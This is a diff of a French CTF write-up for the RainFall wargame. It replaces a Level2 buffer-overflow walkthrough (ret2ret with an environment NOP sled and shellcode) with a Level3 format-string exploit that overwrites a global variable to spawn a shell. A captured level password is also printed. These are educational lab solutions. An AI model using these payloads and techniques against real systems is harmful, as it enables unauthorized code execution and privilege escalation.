@@ -1,215 +1,185 @@
-# Level2
+# Level3: FORMAT STRING
 
 Première étape — tester le programme
 
 ```bash
-$ ./level2
+$ ./level3
 a
 a
 ```
 
 Le programme affiche l'entrée.
 
-Démarrons-le dans GDB
+### Ouvrons le binaire
+```s
+0804851a <main>:
+ 804851a:	55                   	push   %ebp
+ 804851b:	89 e5                	mov    %esp,%ebp
+ 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
+ 8048525:	c9                   	leave  
+ 8048526:	c3                   	ret
 
-```gdb
-(gdb) disas main
-Dump of assembler code for function main:
-   0x0804853f <+0>:	push   ebp
-   0x08048540 <+1>:	mov    ebp,esp
-   0x08048542 <+3>:	and    esp,0xfffffff0
-   0x08048545 <+6>:	call   0x80484d4 <p>
-   0x0804854a <+11>:	leave
-   0x0804854b <+12>:	ret
-End of assembler dump.
+080484a4 <v>:
+ 80484a4:	55                   	push   %ebp
+ 80484a5:	89 e5                	mov    %esp,%ebp
+ 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
+ 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 80484bd:	00
+ 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484c4:	89 04 24             	mov    %eax,(%esp)
+ 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484d2:	89 04 24             	mov    %eax,(%esp)
+ 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
+ 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
+ 80484df:	83 f8 40             	cmp    $0x40,%eax
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
+ 80484e9:	89 c2                	mov    %eax,%edx
+ 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
+ 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 80484f4:	c7 44 24 08 0c 00 00  	movl   $0xc,0x8(%esp)
+ 80484fb:	00
+ 80484fc:	c7 44 24 04 01 00 00  	movl   $0x1,0x4(%esp)
+ 8048503:	00
+ 8048504:	89 04 24             	mov    %eax,(%esp)
+ 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
+ 804850c:	c7 04 24 0d 86 04 08  	movl   $0x804860d,(%esp)
+ 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
+ 8048518:	c9                   	leave  
+ 8048519:	c3                   	ret  
 ```
 
-`main` appelle une fonction `p`.
-
-```gdb
-(gdb) disas p
-Dump of assembler code for function p:
-   0x080484d4 <+0>:	push   ebp
-   0x080484d5 <+1>:	mov    ebp,esp
-   0x080484d7 <+3>:	sub    esp,0x68
-   0x080484da <+6>:	mov    eax,ds:0x8049860
-   0x080484df <+11>:	mov    DWORD PTR [esp],eax
-   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
-   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
-   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
-   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
-   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
-   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
-   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
-   0x080484fb <+39>:	and    eax,0xb0000000
-   0x08048500 <+44>:	cmp    eax,0xb0000000
-   0x08048505 <+49>:	jne    0x8048527 <p+83>
-   0x08048507 <+51>:	mov    eax,0x8048620
-   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
-   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
-   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
-   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
-   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
-   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
-   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
-   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
-   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
-   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
-   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
-   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
-   0x0804853d <+105>:	leave
-   0x0804853e <+106>:	ret
-End of assembler dump.
-```
-
-On voit un appel à `gets()`. `gets()` est dangereux car il permet un débordement de tampon (buffer overflow).
-
----
-
-### Trouver l'offset pour écraser EIP
-
-On va utiliser un motif alphabétique :
-
-```gdb
-(gdb) r
-Starting program: /home/user/level2/level2
-AAAABBBBCCCC...zzz
-AAAABBBBCCCC...zzz
-
-Program received signal SIGSEGV, Segmentation fault.
-0x55555555 in ?? ()
-```
-
-Les 4 octets de l'adresse correspondent à l'hex de 'U'. On remplace ces 4 'U' par BBBB pour vérifier si l'offset est correct.
-
-Test de vérification :
-
-```bash
-$ python -c 'print "a"*80+"BBBB"' > /tmp/payload
-(gdb) r < /tmp/payload
-Starting program: /home/user/level2/level2 < /tmp/payload
-...BBBB...
-
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-```
-
-L'offset pour écraser EIP est donc **80 octets**.
-
----
-
-### Contournement du contrôle anti-stack
-
-Le binaire vérifie si l'adresse écrasée pointe vers la pile et quitte si c'est le cas :
+La première chose que nous pouvons remarquer, c'est que contrairement au niveau précédent nous n'avons pas `gets()` mais `fgets()` (version protégée). Plus loin nous voyons un appel à `printf` particulier : regardons cela de plus près.
 
 ```c
-if ((check & 0xb0000000) == 0xb0000000) {
-    printf("(%p)\n", check);
-    exit(1);
+void v(void)
+{
+  char local_20c[520];
+
+  fgets(local_20c, 0x200, stdin);
+  printf(local_20c);
+  if (m == 0x40) {
+    fwrite("Wait what?!\n", 1, 0xc, stdout);
+    system("/bin/sh");
+  }
+  return;
 }
 ```
 
+- 1ᵉʳ constat : `printf()` prend en paramètre **seulement** le buffer retourné par `fgets()` c'est très dangereux.
+- 2ᵉᵐᵉ constat : il existe une condition qui lance un shell (`system`) si `m == 0x40` c'est notre objectif pour obtenir un shell.
+- 3ᵉᵐᵉ constat : `m` est une variable globale dans la `.bss` comparée à `0x40` (64).
+
+Comme nous le savons, modifier EAX dans GDB au moment du `cmp` ne suffit pas car le kernel set le **SUIDbinary= RUID**. L'objectif ici est donc de **bypasser la condition à l'exécution** en écrivant la valeur `0x40` dans la variable `m` **depuis** l'exécution normale, via une vulnérabilité de format string.
+
+`fgets` empêche l'overflow classique, donc `ret2ret`/ret-overflow n'est pas applicable ici. En revanche `printf(local_20c)` nous donne une voie : **format string exploit**.
+
+### PRINTF (LIBC) — EXPLOIT FORMAT STRING
+
+`printf` est une très bonne fonction quand elle est utilisée correctement. Exemple sûr :
+
+```c
+#include <stdio.h>
+
+int main(void) {
+	char buffer[200] = {0};
+	fgets(buffer, sizeof(buffer), stdin);
+	printf("%s\n", buffer);
+}
 ```
-0x080484fb <+39>:	and    eax,0xb0000000
-0x08048500 <+44>:	cmp    eax,0xb0000000
-0x08048505 <+49>:	jne    0x8048527 <p+83>
+
+Mais si on fait ceci :
+
+```c
+int main(void) {
+	char buffer[200] = {0};
+	fgets(buffer, sizeof(buffer), stdin);
+	printf(buffer); // ⚠️ l'utilisateur contrôle le format
+}
 ```
 
-Pour contourner ça, on place la charge utile (payload) dans une variable d'environnement. Puis on utilise la technique **ret2ret** :
+Alors `printf` interprète la chaîne d'entrée comme **format** : l'attaquant peut utiliser `%x`, `%p`, `%s` pour **lire** la mémoire, ou `%n`, `%hn`, `%hhn` pour **écrire** dans la mémoire.
 
-* écraser EIP par l'adresse d'une instruction `ret` (pour dépiler et passer à l'adresse suivante),
-* placer ensuite l'adresse de la zone NOPsled présente dans l'environnement.
+### Qu'est-ce qu'un "format string exploit" ?
 
-Exemple de génération du payload d'environnement (NOPsled + shellcode) :
+C’est une faille qui arrive quand un programme laisse l’utilisateur écrire directement la phrase que `printf` (ou fonctions similaires) va utiliser pour afficher quelque chose. Imagine que `printf` est une machine qui suit des instructions écrites dans une phrase. Si un utilisateur peut écrire cette phrase, il peut y mettre des instructions que la machine ne devrait pas exécuter.
+
+### Pourquoi c'est dangereux
+
+- `printf("%s", user_input);` → sûr : on affiche la chaîne fournie.
+- `printf(user_input);` → dangereux : l’utilisateur peut écrire des marqueurs (`%x`, `%s`, `%n`, …) qui disent à `printf` de lire ou d’écrire dans la mémoire du programme.
+- Résultat : fuite d’informations (secrets, adresses) ou modification de la mémoire (changer une variable, forcer un chemin d'exécution).
+
+### Calculez l'offset pour l'attaque
+
+Maintenant que nous avons notre point d'entrée (`printf`) et que nous savons que nous devons bypasser `if (m == 0x40)`, nous allons trouver quel paramètre de notre `printf` contient notre donnée.
 
 ```bash
-export payload=$(python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb...\xcd\x80"')
+level3@RainFall:~$ ./level3
+AAAA%p.%p.%p.%p
+AAAA0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141
 ```
 
----
+La présence de `0x41414141` (ASCII de `AAAA`) dans la sortie indique que **notre chaîne `AAAA` est présente** à la position d'argument correspondante dans la pile. On utilise donc `%p`/`%x` pour **trouver l'offset** : l'index d'argument de `printf` où se trouve notre donnée.
 
-### Récupérer l'adresse de la variable d'environnement dans GDB
+> _Attention_ : `0x41414141` n'est **pas** automatiquement l'EIP. C'est la valeur `AAAA` trouvée sur la pile. Pour confirmer si l'EIP est écrasé, il faut regarder les registres et la pile dans GDB après un crash.
 
-Mettre un breakpoint avant le `ret` final :
+Maintenant que nous savons que le 4ᵉ paramètre correspond à `AAAA`, on peut utiliser cet offset pour écrire dans la variable `m`.
 
-```gdb
-(gdb) b *main+12
-Breakpoint 1 at 0x804854b
-(gdb) r
-Starting program: ./level2
-...
-Breakpoint 1, 0x0804854b in main ()
-```
+### Cherchez l'adresse de la variable `m`
 
-Afficher `environ` pour trouver l'adresse :
-
-```gdb
-(gdb) x/200xs environ
-...
-0xbffffb9a: "exploit=\220\220\220\220..."
-```
-
-Ici l'adresse est `0xbffffb9a`.
-
-Examiner la mémoire autour pour choisir une adresse dans le NOPsled :
-
-```gdb
-(gdb) x/200xg 0xbffffb9a
-...
-0xbffffc7c:	0x9090909090909090	0x9090909090909090
-0xbffffc8c:	0x9090909090909090	0x9090909090909090
-0xbffffc9c:	0x9090909090909090	0x9090909090909090
-0xbffffcac:	0x9090909090909090	0x9090909090909090
-0xbffffcbc:	0x9090909090909090	0x9090909090909090
-0xbffffccc:	0x9090909090909090	0x9090909090909090
-0xbffffcdc:	0x9090909090909090	0x9090909090909090
-0xbffffcec:	0x9090909090909090	0x9090909090909090
-0xbffffcfc:	0x9090909090909090	0x9090909090909090
-0xbffffd0c:	0x9090909090909090	0x9090909090909090
-0xbffffd1c:	0x9090909090909090	0x9090909090909090
-0xbffffd2c:	0x9090909090909090	0x9090909090909090
-...
-```
-
-Choisissons `0xbffffcec` (un emplacement dans le NOPsled).
-
----
-
-### Trouver une adresse `ret`
-
-On peut réutiliser l'instruction `ret` de `main` :
-
-```gdb
-(gdb) disas main
-...
-0x0804854b <+12>:	ret
-```
-
-Adresse : `0x0804854b`.
-
----
-
-### Construire l'exploit
-
-Formation du payload : `80 bytes` + `adress_ret` + `adress_env`
-
-Exécution:
+Puisque `m` est dans la section `.bss`, on peut trouver son adresse avec `objdump` (ou `readelf`/`nm`). Exemple extrait :
 
 ```bash
-$ python -c 'print "a"*80+"\x4b\x85\x04\x08"+"\xec\xff\xff\xbf"' |  ./level2
-...
-whoami	
-level3
+level3@RainFall:~$ objdump -t ./level3 | grep "\bm\b"
+0804988c g     O .bss  00000002 m
 ```
 
-et OP OP OP, on obtient un shell.
+Ici l'adresse de `m` est `0x0804988c`.
 
-###  sources
+### Créer l'exploit
 
-``NOPsled``: https://www.youtube.com/watch?v=1S0aBV-Waeo&t=818s
+Principe :
+- Placer l'adresse de `m` (little-endian) dans l'entrée pour que `printf` la lise comme argument.
+- Imprimer un total de 64 caractères (0x40) puis utiliser `%hhn`/`%n` pour écrire le nombre total d'octets imprimés dans l'adresse `m`.
+- Utiliser l'**offset** trouvé auparavant (ici 4) pour indiquer quel argument contient l'adresse.
 
-``shellcode``: http://shell-storm.org/shellcode/files/shellcode-219.html
+Exemple de payload :
 
-``code op``: http://ref.x86asm.net/coder.html
+```bash
+python -c 'print b"\x8c\x98\x04\x08" + b"A"*(64-4) + b"%4$n"'
+```
 
+Explication :
+- `"\x8c\x98\x04\x08"` : adresse de `m` (little-endian).
+- `"A"*(64-4)` : on veut que le total des octets imprimés soit 64 ; 4 octets sont déjà comptés par l'adresse, donc on ajoute 60 `A` (ou autre padding) pour atteindre 64.
+- `"%4$n"` : on utilise la position 4 (offset) et `%n` pour écrire un octet (la valeur 64) à l'adresse pointée par le 4ᵉ argument.
 
+**Note** : selon l'alignement et la libc, il peut être nécessaire d'ajuster l'offset ou d'utiliser `%n`/`%hn` selon le type de la variable. Les spécificateurs positionnels (`%N$...`) rendent souvent l'exploit plus fiable.
+
+### Exécution (exemple)
+
+```bash
+level3@RainFall:~$ (python -c 'print b"\x8c\x98\x04\x08" + b"A"*(64-4) + b"%4$n"'; cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+```
+
+Tada ! L'écriture a fonctionné, la condition `m == 0x40` est vraie, le shell est lancé.
+
+```bash
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+---
+
+Bonne chance et have fun :)
+
+_Pense à tester les offsets dans GDB (ou avec des payloads automatisés) si tu as des différences d'alignement._
